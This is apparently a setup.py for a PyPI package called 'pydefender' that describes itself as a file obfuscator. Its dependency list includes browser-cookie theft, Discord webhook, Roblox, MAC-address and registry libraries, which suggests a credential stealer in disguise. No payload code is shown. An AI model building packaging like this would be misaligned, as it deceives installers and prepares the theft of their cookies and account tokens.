from setuptools import setup, find_packages

setup(
  name="pydefender",
  version='1.0.0',
  author="KoalaDev",
  author_email="koaladev@gmail.com",
  description="Python Obfuscate Any File, use pip install pydefender and python -m pydefender to use it.",
  long_description_content_type="text/markdown",
  url="https://github.com/koaladev",
  project_urls={
    "GitHub": "https://github.com/koaladev/",
  },
  license="MIT",
  keywords=["discord"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  packages=find_packages(),
  install_requires=['requests', 'sockets', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy', 'Pillow', 'tqdm']
)